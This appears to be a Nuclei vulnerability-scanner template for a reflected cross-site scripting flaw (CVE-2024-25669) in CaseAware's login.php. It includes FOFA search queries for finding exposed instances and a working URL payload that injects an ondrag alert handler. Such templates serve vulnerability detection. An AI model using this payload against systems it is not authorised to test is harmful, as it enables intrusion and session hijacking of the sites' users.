id: caseaware-xss
info:
  name: CaseAware a360inc - Cross-Site Scripting
  author: r3naissance
  severity: medium
  description: |
    a360inc CaseAware contains a reflected cross-site scripting vulnerability via the user parameter transmitted in the login.php query string. This is a bypass of the fix reported in 2017
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement
  remediation: |
    To remediate this vulnerability, it is recommended to apply the latest patches or updates provided by the vendor.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-25669
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    cpe: cpe:2.3:a:a360inc:caseaware:-:*:*:*:*:*:*:*
    epss-score: 0.00286
    epss-percentile: 0.65504
  metadata:
    fofa-query:
      - title="CaseAware"
      - title="caseaware"
    max-request: 1
    product: caseaware
    vendor: a360inc
    verified: true
  tags: a360inc,caseaware,vuln,xss
http:
  - method: GET
    path:
      - "{{BaseURL}}/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "value='test' draggable=true ondrag=alert(document.domain)"
          - "CaseAware"
        condition: and
      - type: word
        part: header
        words:
          - text/html
      - type: status
        status:
          - 200
